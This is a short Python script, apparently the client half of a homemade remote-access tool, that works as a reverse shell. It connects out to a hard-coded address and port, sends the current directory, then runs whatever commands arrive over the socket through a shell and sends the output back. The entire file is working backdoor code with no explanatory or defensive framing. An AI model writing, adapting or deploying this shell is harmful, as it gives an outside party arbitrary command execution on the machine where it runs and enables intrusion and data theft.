# client side
from socket import *
import os
import subprocess

ip = '192.168.37.150'
port = 1321
socket_connection = socket(AF_INET, SOCK_STREAM)
socket_connection.connect((ip, port))
# to see the current directory
socket_connection.send(os.getcwd() + ' >\n')
while True:
    receive_data = socket_connection.recv(1024)
    if receive_data == '-':
        continue
    elif receive_data[0:2] == 'cd':
        try:
            os.chdir(receive_data[3:])
            current_path = os.getcwd()
            socket_connection.sendall('The current path is ' + str(current_path) + '\n')
            continue
        except:
            socket_connection.send('Directory is\'nt existence.\n')
            continue
    shell_command = subprocess.Popen(receive_data, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE)
    value = shell_command.stdout.read() + shell_command.stderr.read()

    if value is None or value == '':
        socket_connection.send('The command Done successfully !!\n')
        continue

    socket_connection.sendall(value)

socket_connection.close()
